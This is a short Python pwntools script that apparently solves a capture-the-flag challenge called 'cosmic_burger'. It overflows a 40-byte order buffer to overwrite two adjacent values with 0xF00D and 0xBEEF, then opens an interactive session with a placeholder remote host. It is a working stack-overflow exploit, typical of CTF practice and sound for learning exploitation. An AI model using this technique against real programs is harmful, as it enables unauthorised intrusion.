#!/usr/bin/env python3
from pwn import *

exe = ELF("./cosmic_burger")
context.binary = exe
context.arch   = 'amd64'
context.os     = 'linux'

HOSTNAME = 'HOSTNAME_PLACEHOLDER'
PORT     = 0  # PORT_PLACEHOLDER

# ── offsets ───────────────────────────────────────────────────────────────────
OFFSET_TO_CHEESE = 40
OFFSET_TO_SAUCE  = 44

def conn():
    if args.LOCAL:
        return process(exe.path)
    return remote(HOSTNAME, PORT)

def main():
    r = conn()

    # ── exploit phase ─────────────────────────────────────────────────────────
    payload = flat(
        b'A' * OFFSET_TO_CHEESE,   # fill order buffer + alignment gap
        p32(0xF00D),                # cheese at offset 40
        p32(0xBEEF),                # sauce  at offset 44
    )

    r.recvuntil(b"What's your order?\n")
    r.sendline(payload)
    r.interactive()

if __name__ == '__main__':
    main()